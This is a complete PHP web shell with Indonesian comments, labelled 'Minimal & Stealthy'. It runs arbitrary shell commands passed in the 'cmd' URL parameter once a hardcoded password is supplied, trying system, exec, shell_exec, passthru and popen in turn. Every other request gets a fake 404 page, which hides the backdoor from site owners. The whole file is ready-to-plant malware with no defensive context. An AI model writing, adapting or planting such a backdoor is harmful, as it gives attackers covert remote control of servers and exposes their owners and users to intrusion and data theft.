<?php
/**
 * Simple CMD Shell
 * Minimal & Stealthy
 */

// Authentication (ganti password ini!)
$auth_pass = "admin123"; // GANTI INI!

// Check password
if(isset($_GET['pass']) && $_GET['pass'] == $auth_pass) {
    
    // Execute command
    if(isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        
        // Method 1: system()
        if(function_exists('system')) {
            echo "<pre>";
            system($cmd);
            echo "</pre>";
            exit;
        }
        
        // Method 2: exec()
        if(function_exists('exec')) {
            $output = array();
            exec($cmd, $output);
            echo "<pre>" . implode("\n", $output) . "</pre>";
            exit;
        }
        
        // Method 3: shell_exec()
        if(function_exists('shell_exec')) {
            echo "<pre>" . shell_exec($cmd) . "</pre>";
            exit;
        }
        
        // Method 4: passthru()
        if(function_exists('passthru')) {
            echo "<pre>";
            passthru($cmd);
            echo "</pre>";
            exit;
        }
        
        // Method 5: popen()
        if(function_exists('popen')) {
            $handle = popen($cmd, 'r');
            $output = '';
            while(!feof($handle)) {
                $output .= fread($handle, 1024);
            }
            pclose($handle);
            echo "<pre>" . $output . "</pre>";
            exit;
        }
        
        echo "All exec functions disabled!";
    } else {
        echo "Usage: ?pass=" . $auth_pass . "&cmd=whoami";
    }
} else {
    // Fake 404 page
    header("HTTP/1.0 404 Not Found");
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>";
}
?>
